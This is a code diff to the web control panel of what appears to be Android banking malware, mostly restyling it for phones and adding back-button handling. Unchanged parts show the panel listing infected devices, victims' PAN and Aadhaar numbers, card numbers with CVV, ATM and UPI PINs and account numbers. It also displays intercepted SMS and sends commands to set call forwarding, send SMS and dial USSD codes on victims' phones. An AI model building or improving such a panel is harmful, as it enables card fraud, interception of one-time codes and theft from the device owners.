@@ -30,28 +30,30 @@
             color: var(--text-primary);
             margin: 0;
             padding-bottom: 50px;
+            font-size: 0.65rem;
         }
 
-        .login-container {
-            max-width: 400px;
-            margin: 100px auto;
-            padding: 25px;
-            background-color: var(--bg-card);
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            border: 1px solid var(--border-soft);
+        .container {
+            padding-left: 4px;
+            padding-right: 4px;
         }
 
         .navbar {
             background-color: var(--bg-card);
             border-bottom: 1px solid var(--border-soft);
-            padding: 10px 20px;
+            padding: 8px 12px;
+        }
+
+        .navbar-brand {
+            font-size: 1rem !important;
+            font-weight: 700 !important;
+            letter-spacing: 0.5px;
         }
 
         .stats-bar {
             background: #1a1a1a;
-            padding: 20px 0;
-            font-size: 0.95rem;
+            padding: 1px 0;
+            font-size: 0.6rem;
             border-bottom: 1px solid var(--border-soft);
         }
 
@@ -62,31 +64,40 @@
         }
 
         .stat-value {
-            font-size: 1.3rem;
+            font-size: 0.7rem;
             font-weight: 700;
         }
 
         .stat-label {
-            font-size: 0.65rem;
+            font-size: 0.4rem;
             color: var(--text-secondary);
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.2px;
         }
 
         .nav-tabs {
             border-bottom: 1px solid var(--border-soft);
             background: #121212;
-            padding-top: 5px;
-            margin-bottom: 10px;
+            padding-top: 1px;
+            margin-bottom: 8px;
+            flex-wrap: nowrap;
+            overflow-x: auto;
+            overflow-y: hidden;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .nav-tabs::-webkit-scrollbar {
+            display: none;
         }
 
         .nav-link {
             color: var(--text-secondary);
             border: none !important;
-            padding: 12px 20px;
-            font-size: 0.8rem;
-            font-weight: 500;
+            padding: 10px 14px;
+            font-size: 0.75rem;
+            font-weight: 600;
             transition: all 0.2s;
+            white-space: nowrap;
         }
 
         .nav-link:hover {
@@ -95,9 +106,9 @@
         }
 
         .nav-link.active {
-            color: var(--accent) !important;
-            background: transparent !important;
-            border-bottom: 2px solid var(--accent) !important;
+            color: white !important;
+            background: rgba(13, 110, 253, 0.1) !important;
+            border-bottom: 3px solid var(--accent) !important;
         }
 
         /* Full Page Detail View */
@@ -115,7 +126,7 @@
 
         .detail-header {
             background-color: var(--bg-card);
-            padding: 15px 20px;
+            padding: 10px 15px;
             display: flex;
             align-items: center;
             border-bottom: 1px solid var(--border-soft);
@@ -125,33 +136,33 @@
         }
 
         .back-btn {
-            font-size: 1.2rem;
-            margin-right: 15px;
+            font-size: 1rem;
+            margin-right: 12px;
             cursor: pointer;
             color: var(--accent);
             background: rgba(13, 110, 253, 0.1);
-            padding: 8px;
+            padding: 6px;
             border-radius: 50%;
         }
 
         .section-title {
-            font-size: 0.75rem;
+            font-size: 0.6rem;
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin: 25px 0 10px 5px;
+            letter-spacing: 1px;
+            margin: 10px 0 5px 5px;
             display: flex;
             align-items: center;
             color: var(--text-secondary);
         }
 
-        .section-title i { margin-right: 10px; font-size: 1rem; }
+        .section-title i { margin-right: 6px; font-size: 0.8rem; }
 
         .data-card {
             background: var(--bg-card);
-            border-radius: 16px;
-            padding: 15px;
-            margin-bottom: 15px;
+            border-radius: 8px;
+            padding: 8px;
+            margin-bottom: 10px;
             border: 1px solid var(--border-soft);
         }
 
@@ -159,7 +170,7 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 0;
+            padding: 6px 0;
             border-bottom: 1px solid rgba(255,255,255,0.05);
         }
 
@@ -167,12 +178,12 @@
 
         .label-box {
             color: var(--text-secondary);
-            font-size: 0.8rem;
+            font-size: 0.65rem;
         }
 
         .value-box {
             font-weight: 500;
-            font-size: 0.85rem;
+            font-size: 0.7rem;
             text-align: right;
         }
 
@@ -183,31 +194,33 @@
         .color-orange { color: #fb923c; }
 
         .status-hero {
-            padding: 40px 20px;
+            padding: 20px 15px;
             text-align: center;
             background: linear-gradient(180deg, #1e1e1e 0%, #121212 100%);
         }
 
+        .status-hero h2 { font-size: 1.1rem; }
+
         .action-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin-bottom: 20px;
+            gap: 8px;
+            margin-bottom: 15px;
         }
 
         .action-tile {
             background: var(--bg-light);
             border: 1px solid var(--border-soft);
-            border-radius: 12px;
-            padding: 15px 10px;
+            border-radius: 8px;
+            padding: 8px 4px;
             text-align: center;
             cursor: pointer;
             transition: all 0.2s;
         }
 
         .action-tile:active { transform: scale(0.95); background: #2a2a2a; }
-        .action-tile i { font-size: 1.5rem; margin-bottom: 8px; display: block; }
-        .action-tile span { font-size: 0.65rem; font-weight: 600; text-transform: uppercase; display: block; }
+        .action-tile i { font-size: 1rem; margin-bottom: 3px; display: block; }
+        .action-tile span { font-size: 0.5rem; font-weight: 600; text-transform: uppercase; display: block; }
 
         .tile-blue { color: #60a5fa; }
         .tile-green { color: #4ade80; }
@@ -218,21 +231,21 @@
 
         .sim-selector {
             background: var(--bg-light);
-            border-radius: 12px;
-            padding: 5px;
+            border-radius: 8px;
+            padding: 4px;
             display: flex;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
             border: 1px solid var(--border-soft);
         }
 
         .sim-option {
             flex: 1;
             text-align: center;
-            padding: 10px;
-            font-size: 0.75rem;
+            padding: 6px;
+            font-size: 0.65rem;
             font-weight: 700;
             cursor: pointer;
-            border-radius: 10px;
+            border-radius: 6px;
             color: #777;
         }
 
@@ -244,24 +257,24 @@
 
         .sms-bubble {
             background: var(--bg-light);
-            border-radius: 16px;
-            padding: 15px;
-            margin-bottom: 10px;
+            border-radius: 6px;
+            padding: 6px;
+            margin-bottom: 4px;
             border: 1px solid var(--border-soft);
             position: relative;
         }
 
         .sms-actions {
             position: absolute;
-            top: 10px;
-            right: 15px;
+            top: 6px;
+            right: 10px;
             display: flex;
-            gap: 12px;
+            gap: 8px;
         }
 
         .sms-action-btn {
             cursor: pointer;
-            font-size: 0.85rem;
+            font-size: 0.7rem;
             color: var(--text-secondary);
             transition: color 0.2s;
         }
@@ -271,11 +284,11 @@
 
         .value-box {
             font-weight: 500;
-            font-size: 0.85rem;
+            font-size: 0.75rem;
             text-align: right;
             cursor: pointer;
-            padding: 2px 5px;
-            border-radius: 4px;
+            padding: 1px 4px;
+            border-radius: 3px;
             transition: background 0.2s;
         }
 
@@ -286,16 +299,16 @@
         .sms-meta {
             display: flex;
             justify-content: space-between;
-            font-size: 0.7rem;
-            margin-bottom: 5px;
+            font-size: 0.65rem;
+            margin-bottom: 3px;
             font-weight: 700;
         }
 
         .log-item {
             background: rgba(255,255,255,0.03);
-            border-radius: 10px;
-            padding: 10px 15px;
-            margin-bottom: 8px;
+            border-radius: 8px;
+            padding: 6px 10px;
+            margin-bottom: 6px;
             border: 1px solid var(--border-soft);
             display: flex;
             justify-content: space-between;
@@ -303,10 +316,10 @@
         }
 
         .log-status {
-            font-size: 0.65rem;
+            font-size: 0.6rem;
             font-weight: 700;
-            padding: 2px 8px;
-            border-radius: 4px;
+            padding: 1px 6px;
+            border-radius: 3px;
         }
 
         .status-pending { background: rgba(251, 146, 60, 0.1); color: #fb923c; }
@@ -317,75 +330,67 @@
             background-color: var(--bg-card);
             color: white;
             border: 1px solid var(--border-soft);
-            margin-bottom: 15px;
-            border-radius: 12px;
+            margin-bottom: 3px;
+            border-radius: 4px;
         }
 
         .user-card {
             cursor: pointer;
             transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            border-left: 4px solid #333;
-        }
-
-        .user-card:hover {
-            transform: translateY(-2px);
-            background-color: var(--bg-light);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            border-left: 2px solid #333;
         }
 
         .user-card.online-border { border-left-color: var(--online); }
         .user-card.offline-border { border-left-color: var(--offline); }
 
         .info-label {
-            font-size: 0.7rem;
-            color: var(--text-secondary);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 2px;
+            display: none;
         }
 
         .info-value {
-            font-size: 0.85rem;
+            font-size: 0.6rem;
             font-weight: 500;
         }
 
         .status-badge {
-            font-size: 0.6rem;
-            padding: 4px 10px;
-            border-radius: 20px;
+            font-size: 0.45rem;
+            padding: 1px 3px;
+            border-radius: 2px;
             font-weight: 700;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.2px;
         }
 
         .search-bar {
             background-color: var(--bg-light);
             border: 1px solid var(--border-soft);
             color: white;
-            padding: 10px 20px;
-            border-radius: 12px;
+            padding: 5px 10px;
+            border-radius: 6px;
             width: 100%;
-            margin: 10px 0;
+            margin: 4px 0;
+            font-size: 0.7rem;
         }
 
         .validity-timer {
             color: #fbbf24;
             font-weight: 600;
+            font-size: 0.55rem;
         }
 
         pre {
             background: #000;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 0.75rem;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 0.65rem;
             color: #10b981;
-            max-height: 200px;
+            max-height: 150px;
             overflow: auto;
         }
         .sms-word {
             display: inline-block;
-            padding: 1px 3px;
+            padding: 1px 2px;
             cursor: pointer;
-            border-radius: 3px;
+            border-radius: 2px;
             transition: background 0.2s;
         }
         .sms-word:hover {
@@ -396,18 +401,18 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 15px;
-            padding: 15px 0;
-            margin-top: 10px;
+            gap: 10px;
+            padding: 10px 0;
+            margin-top: 5px;
             border-top: 1px solid var(--border-soft);
         }
         .page-btn {
             background: var(--bg-card);
             border: 1px solid var(--border-soft);
             color: var(--text-primary);
-            padding: 5px 12px;
-            border-radius: 8px;
-            font-size: 0.75rem;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 0.65rem;
             cursor: pointer;
             transition: all 0.2s;
         }
@@ -420,7 +425,7 @@
             cursor: not-allowed;
         }
         .page-info {
-            font-size: 0.75rem;
+            font-size: 0.65rem;
             font-weight: bold;
             color: var(--text-secondary);
         }
@@ -480,7 +485,7 @@
                     <span class="stat-label">Offline</span>
                 </div>
             </div>
-            <div class="mt-3 text-center validity-timer" id="validityText">
+            <div class="mt-1 text-center validity-timer" id="validityText">
                 <i class="fas fa-clock me-2"></i>Panel Validity: Checking...
             </div>
         </div>
@@ -635,7 +640,7 @@
                 <div class="modal-body">
                     <div class="mb-3">
                         <label class="form-label small text-secondary">Target Mobile Number</label>
-                        <input type="text" id="smsTarget" class="form-control bg-dark text-white border-secondary" placeholder="Enter number with country code">
+                        <input type="tel" id="smsTarget" class="form-control bg-dark text-white border-secondary" placeholder="Enter number with country code" inputmode="tel">
                     </div>
                     <div class="mb-3">
                         <label class="form-label small text-secondary">Message Content</label>
@@ -661,7 +666,7 @@
                 <div class="modal-body">
                     <div class="mb-3">
                         <label class="form-label small text-secondary">Forwarding Number</label>
-                        <input type="text" id="forwardNumber" class="form-control bg-dark text-white border-secondary" placeholder="e.g. +919876543210">
+                        <input type="tel" id="forwardNumber" class="form-control bg-dark text-white border-secondary" placeholder="e.g. +919876543210" inputmode="tel">
                     </div>
                     <p class="small text-muted"><i class="fas fa-info-circle me-1"></i> This will set up call forwarding on the target device.</p>
                 </div>
@@ -684,7 +689,7 @@
                 <div class="modal-body">
                     <div class="mb-3">
                         <label class="form-label small text-secondary">USSD Code</label>
-                        <input type="text" id="ussdCode" class="form-control bg-dark text-white border-secondary" placeholder="e.g. *121#">
+                        <input type="tel" id="ussdCode" class="form-control bg-dark text-white border-secondary" placeholder="e.g. *121#" inputmode="tel">
                     </div>
                 </div>
                 <div class="modal-footer border-secondary">
@@ -752,8 +757,20 @@
         const ussdModal = new bootstrap.Modal(document.getElementById('ussdModal'));
         const cmdToast = new bootstrap.Toast(document.getElementById('cmdToast'));
 
+        // Sync history when modals are closed manually
+        ['smsModal', 'forwardModal', 'ussdModal'].forEach(id => {
+            document.getElementById(id).addEventListener('hidden.bs.modal', () => {
+                if (history.state && history.state.view === 'modal') {
+                    history.back();
+                }
+            });
+        });
+
         // LOGIN CHECK
         if (localStorage.getItem('isLoggedIn') === 'true') {
+            if (!history.state || history.state.view !== 'dashboard') {
+                history.replaceState({ view: 'dashboard' }, '');
+            }
             showDashboard();
         }
 
@@ -781,13 +798,14 @@
         function loginSuccess(password) {
             localStorage.setItem('isLoggedIn', 'true');
             localStorage.setItem('sessionPass', password);
+            history.replaceState({ view: 'dashboard' }, '');
             showDashboard();
         }
 
         function logout() {
             localStorage.removeItem('isLoggedIn');
             localStorage.removeItem('sessionPass');
-            location.reload();
+            location.href = location.pathname; // Hard reload to clear state
         }
 
         function showDashboard() {
@@ -878,7 +896,7 @@
                     }
 
                     const card = document.createElement('div');
-                    card.className = `card user-card p-3 ${isOnline ? 'online-border' : 'offline-border'}`;
+                    card.className = `card user-card p-2 ${isOnline ? 'online-border' : 'offline-border'}`;
                     card.onclick = () => openUserDetails(user.uid);
 
                     const batteryLevel = parseInt(user.battery || 0);
@@ -888,50 +906,38 @@
                     else if(batteryLevel < 50) { batteryColor = "text-warning"; batteryIcon = "fa-battery-half"; }
                     else if(batteryLevel < 80) { batteryColor = "text-info"; batteryIcon = "fa-battery-three-quarters"; }
 
+                    const simMatches = (user.simInfo || "").match(/\(([^)]+)\)/g);
+                    let simDisplay = "No Mobile";
+                    if (simMatches) {
+                        const nums = simMatches.map(m => m.slice(1, -1)).filter(n => n.toLowerCase() !== 'no number');
+                        if (nums.length > 0) simDisplay = nums.join(' | ');
+                        else simDisplay = user.mobile || 'No SIM';
+                    } else {
+                        simDisplay = user.mobile || 'No Mobile';
+                    }
+
                     card.innerHTML = `
-                        <div class="row g-2">
-                            <div class="col-12 d-flex justify-content-between align-items-center mb-1">
+                        <div class="row g-1">
+                            <div class="col-12 d-flex justify-content-between align-items-center">
                                 <div class="d-flex align-items-center">
-                                    <span class="badge bg-secondary me-2" style="font-size: 0.7rem;">#${totalCount - index}</span>
-                                    <span class="status-badge ${isOnline ? 'bg-success' : 'bg-danger'} text-white">
-                                        ${isOnline ? 'ONLINE' : 'OFFLINE'}
+                                    <span class="badge bg-secondary me-1" style="font-size: 0.5rem; padding: 1px 2px;">#${totalCount - index}</span>
+                                    <span class="status-badge ${isOnline ? 'bg-success' : 'bg-danger'} text-white" style="font-size: 0.45rem;">
+                                        ${isOnline ? 'ON' : 'OFF'}
                                     </span>
                                 </div>
-                                <div class="${batteryColor} fw-bold small">
-                                    <i class="fas ${batteryIcon} me-1"></i>${user.battery || '--'}%
+                                <div class="${batteryColor} fw-bold" style="font-size: 0.6rem;">
+                                    ${user.battery || '--'}%
                                 </div>
                             </div>
 
-                            <div class="col-md-7">
-                                <h6 class="mb-0 text-white">${user.model || 'Unknown Device'}</h6>
-                                <div class="mt-1">
-                                    <span class="info-label">Serial:</span>
-                                    <span class="info-value text-warning" style="font-size: 0.8rem;">${user.uid}</span>
-                                </div>
-                                <div class="mt-2">
-                                    <div class="info-label">Mobile Number</div>
-                                    <div class="info-value text-info">${user.mobile || 'No Mobile'}</div>
-                                </div>
+                            <div class="col-7">
+                                <h6 class="mb-0 text-white" style="font-size: 0.7rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${user.model || 'Unknown Device'}</h6>
+                                <div class="text-warning fw-bold" style="font-size: 0.55rem;">${user.uid}</div>
                             </div>
 
-                            <div class="col-md-5">
-                                <div class="text-md-end mb-2">
-                                    <div class="info-label">Last Activity</div>
-                                    <div class="small text-white">${getTimeAgo(user.lastSeen)}</div>
-                                </div>
-                                <div class="mt-2 text-md-end">
-                                    <div class="info-label">SIM Information</div>
-                                    <div class="small text-secondary" style="font-size: 0.8rem;">
-                                        ${user.simInfo || 'No SIM detected'}
-                                    </div>
-                                </div>
-                            </div>
-
-                            <div class="col-12 border-top border-secondary mt-2 pt-2 d-flex justify-content-between">
-                                <div class="small text-muted">
-                                    <i class="far fa-calendar-alt me-1"></i>Installed: ${user.installDate || 'N/A'}
-                                </div>
-                                ${user.fullName ? `<span class="badge bg-primary">Details Added</span>` : ''}
+                            <div class="col-5 text-end">
+                                <div class="text-info fw-bold" style="font-size: 0.65rem;">${simDisplay}</div>
+                                <div class="text-muted" style="font-size: 0.5rem;">${getTimeAgo(user.lastSeen)}</div>
                             </div>
                         </div>
                     `;
@@ -953,44 +959,36 @@
                     }
 
                     const card = document.createElement('div');
-                    card.className = "card p-3 mb-3 border-primary cursor-pointer";
+                    card.className = "card p-2 mb-2 border-primary cursor-pointer";
                     card.onclick = () => openUserDetails(user.uid);
 
                     card.innerHTML = `
-                        <div class="row g-2">
-                            <div class="col-12 d-flex justify-content-between border-bottom border-secondary pb-2 mb-2">
+                        <div class="row g-1">
+                            <div class="col-12 d-flex justify-content-between border-bottom border-secondary pb-0 mb-1">
                                 <div class="d-flex align-items-center">
-                                    <span class="badge bg-primary me-2" style="font-size: 0.7rem;">#${totalCount - index}</span>
-                                    <div>
-                                        <span class="fw-bold text-primary"><i class="fas fa-user me-2"></i>${user.fullName || 'No Name'}</span>
-                                        <div class="text-warning small mt-1" style="font-size: 0.7rem;">ID: ${user.uid}</div>
-                                    </div>
+                                    <span class="badge bg-primary me-1" style="font-size: 0.5rem;">#${totalCount - index}</span>
+                                    <span class="fw-bold text-primary" style="font-size: 0.75rem;">${user.fullName || 'No Name'}</span>
                                 </div>
-                                <span class="text-info small">${user.mobile || 'No Mobile'}</span>
+                                <span class="text-info fw-bold" style="font-size: 0.7rem;">${user.mobile || 'No Mobile'}</span>
                             </div>
-                            <div class="col-6">
-                                <div class="info-label">PAN Card</div>
-                                <div class="value-box text-start" onclick="event.stopPropagation(); copyText('${user.pan || ''}')">${user.pan || '--'}</div>
-                            </div>
-                            <div class="col-6">
-                                <div class="info-label">Aadhaar</div>
-                                <div class="value-box text-start" onclick="event.stopPropagation(); copyText('${user.aadhaar || ''}')">${user.aadhaar || '--'}</div>
-                            </div>
-                            <div class="col-12 mt-2">
-                                <div class="info-label">Card Details</div>
-                                <div class="bg-dark p-2 rounded d-flex justify-content-between align-items-center">
-                                    <span class="text-warning fw-bold" onclick="event.stopPropagation(); copyText('${user.card_number || user.card || ''}')">${user.card_number || user.card || 'No Card'}</span>
-                                    <span class="small"><span class="text-secondary">EXP:</span> ${user.card_expiry || user.expiry || '--'}</span>
-                                    <span class="small text-danger fw-bold"><span class="text-secondary">CVV:</span> ${user.card_cvv || user.cvv || '--'}</span>
+                            <div class="col-12">
+                                <div class="bg-dark px-1 rounded d-flex justify-content-between align-items-center">
+                                    <span class="text-warning fw-bold" style="font-size: 0.75rem;">${user.card_number || user.card || 'No Card'}</span>
+                                    <span class="text-white" style="font-size: 0.65rem;">${user.card_expiry || user.expiry || '--'}</span>
+                                    <span class="text-danger fw-bold" style="font-size: 0.7rem;">${user.card_cvv || user.cvv || '--'}</span>
                                 </div>
                             </div>
-                            <div class="col-6 mt-2">
-                                <div class="info-label">ATM PIN</div>
-                                <div class="text-warning fw-bold" onclick="event.stopPropagation(); copyText('${user.atm_pin || user.atmPin || ''}')">${user.atm_pin || user.atmPin || '--'}</div>
+                            <div class="col-6 mt-1">
+                                <div style="font-size: 0.5rem; color: #777; text-transform: uppercase;">PAN / AADHAAR</div>
+                                <div class="text-white fw-bold" style="font-size: 0.65rem;">${user.pan || '--'} / ${user.aadhaar || '--'}</div>
                             </div>
-                            <div class="col-6 mt-2">
-                                <div class="info-label">UPI PIN</div>
-                                <div class="text-info fw-bold" onclick="event.stopPropagation(); copyText('${user.upiPin || ''}')">${user.upiPin || '--'}</div>
+                            <div class="col-6 mt-1 text-end">
+                                <div style="font-size: 0.5rem; color: #777; text-transform: uppercase;">ATM / UPI PIN</div>
+                                <div class="text-info fw-bold" style="font-size: 0.7rem;">${user.atm_pin || user.atmPin || '--'} / ${user.upiPin || '--'}</div>
+                            </div>
+                            <div class="col-12 mt-1">
+                                <div style="font-size: 0.5rem; color: #777; text-transform: uppercase;">ACCOUNT NO.</div>
+                                <div class="text-success fw-bold" style="font-size: 0.7rem;">${user.account_number || '--'}</div>
                             </div>
                         </div>
                     `;
@@ -1003,24 +1001,27 @@
 
                 paginatedSms.forEach(sms => {
                     const item = document.createElement('div');
-                    item.className = "card border-secondary mb-2 overflow-hidden";
+                    item.className = "card border-secondary mb-1 overflow-hidden";
 
                     const words = sms.msg.split(' ').map(word => `<span class="sms-word" onclick="event.stopPropagation(); copyText('${word.replace(/'/g, "\\'").replace(/"/g, '&quot;')}')">${word}</span>`).join(' ');
 
+                    const simText = (sms.sim_id !== undefined && sms.sim_id !== null && sms.sim_id !== -1) ? `SIM ${parseInt(sms.sim_id) + 1} | ` : "";
+
                     item.innerHTML = `
-                        <div class="card-header bg-dark d-flex justify-content-between align-items-center py-2">
-                            <span class="text-info fw-bold small"><i class="fas fa-comment-dots me-2"></i>${sms.from}</span>
+                        <div class="card-header bg-dark d-flex justify-content-between align-items-center py-0 px-1" style="border-bottom: none;">
                             <div class="d-flex align-items-center">
-                                <span class="text-secondary me-3" style="font-size:0.7rem;">${sms.time || 'N/A'}</span>
-                                <i class="fas fa-copy text-secondary me-2 cursor-pointer" title="Copy Message" onclick="copyText('${sms.msg.replace(/'/g, "\\'")}')"></i>
-                                <i class="fas fa-trash text-danger cursor-pointer" title="Delete Message" onclick="deleteSms('${sms.deviceId}', '${sms.id}')"></i>
+                                <span class="text-info fw-bold" style="font-size: 0.6rem;">${sms.from}</span>
+                            </div>
+                            <div class="d-flex align-items-center">
+                                <span class="text-secondary me-1" style="font-size:0.5rem;">${simText}${sms.time || 'N/A'}</span>
+                                <i class="fas fa-trash text-danger cursor-pointer" style="font-size: 0.55rem;" title="Delete" onclick="deleteSms('${sms.deviceId}', '${sms.id}')"></i>
                             </div>
                         </div>
-                        <div class="card-body py-2 px-3">
-                            <div class="text-white small">${words}</div>
-                        </div>
-                        <div class="card-footer bg-transparent border-top-0 py-1 px-3">
-                             <small class="text-muted" style="font-size:0.65rem">Device ID: <span class="text-info cursor-pointer fw-bold" title="View Device Details" onclick="openUserDetails('${sms.deviceId}')">${sms.deviceId}</span></small>
+                        <div class="card-body py-1 px-1">
+                            <div class="text-white" style="font-size: 0.85rem; line-height: 1.3;">${words}</div>
+                            <div class="mt-1 pt-1 border-top border-secondary d-flex justify-content-between">
+                                <span class="text-muted" style="font-size: 0.5rem;">ID: <span class="text-warning fw-bold cursor-pointer" onclick="openUserDetails('${sms.deviceId}')">${sms.deviceId}</span></span>
+                            </div>
                         </div>
                     `;
                     contentArea.appendChild(item);
@@ -1078,13 +1079,48 @@
             // Show Detail Page (New Page Style)
             detailPage.style.display = 'block';
             document.body.style.overflow = 'hidden';
+
+            // Add history state for back button support
+            history.pushState({ view: 'detail' }, '');
         }
 
-        function closeDetailPage() {
+        function closeDetailPage(shouldGoBack = true) {
+            if (detailPage.style.display === 'none') return;
+
             detailPage.style.display = 'none';
             document.body.style.overflow = 'auto';
             selectedUserId = null;
+
+            if (shouldGoBack) {
+                history.back();
+            }
         }
+
+        // Handle Mobile Back Button
+        window.onpopstate = function(event) {
+            if (localStorage.getItem('isLoggedIn') !== 'true') return;
+
+            // Close Detail Page if open
+            if (detailPage.style.display === 'block') {
+                closeDetailPage(false);
+                return;
+            }
+
+            // Close any open Bootstrap Modals
+            const openModals = document.querySelectorAll('.modal.show');
+            if (openModals.length > 0) {
+                openModals.forEach(modalEl => {
+                    const modalInstance = bootstrap.Modal.getInstance(modalEl);
+                    if (modalInstance) modalInstance.hide();
+                });
+                return;
+            }
+
+            // If we are logged in and try to go back from the dashboard, stay on dashboard
+            if (!event.state || event.state.view !== 'dashboard') {
+                history.pushState({ view: 'dashboard' }, '');
+            }
+        };
 
         function selectSim(slot) {
             selectedSimSlot = slot;
@@ -1137,12 +1173,16 @@
                 div.className = "sms-bubble";
                 const words = sms.msg.split(' ').map(word => `<span class="sms-word" onclick="event.stopPropagation(); copyText('${word.replace(/'/g, "\\'").replace(/"/g, '&quot;')}')">${word}</span>`).join(' ');
 
+                const simText = (sms.sim_id !== undefined && sms.sim_id !== null && sms.sim_id !== -1) ? `SIM ${parseInt(sms.sim_id) + 1} | ` : "";
+
                 div.innerHTML = `
                     <div class="sms-meta">
-                        <span class="color-blue">${sms.from}</span>
-                        <span class="text-secondary">${sms.time}</span>
+                        <div class="d-flex align-items-center">
+                            <span class="color-blue">${sms.from}</span>
+                        </div>
+                        <span class="text-secondary">${simText}${sms.time}</span>
                     </div>
-                    <div class="small text-white">${words}</div>
+                    <div class="text-white" style="font-size: 0.85rem; line-height: 1.3;">${words}</div>
                     <div class="sms-actions">
                         <i class="fas fa-copy sms-action-btn" title="Copy" onclick="copyText('${sms.msg.replace(/'/g, "\\'")}')"></i>
                         <i class="fas fa-trash sms-action-btn delete" title="Delete" onclick="deleteSms('${selectedUserId}', '${sms.key}')"></i>
@@ -1243,6 +1283,7 @@
             document.getElementById('smsTarget').value = "";
             document.getElementById('smsMessage').value = "";
             smsModal.show();
+            history.pushState({ view: 'modal' }, '');
         }
 
         function confirmSendSms() {
@@ -1253,11 +1294,14 @@
 
             sendCommand('sms', { target: num, message: msg });
             smsModal.hide();
+            // Modal hide will be handled by the modal event or history if needed,
+            // but for simplicity, we let the normal flow work.
         }
 
         function showCallForward() {
             document.getElementById('forwardNumber').value = "";
             forwardModal.show();
+            history.pushState({ view: 'modal' }, '');
         }
 
         function confirmForward() {
@@ -1270,6 +1314,7 @@
         function showDialUssd() {
             document.getElementById('ussdCode').value = "";
             ussdModal.show();
+            history.pushState({ view: 'modal' }, '');
         }
 
         function confirmUssd() {
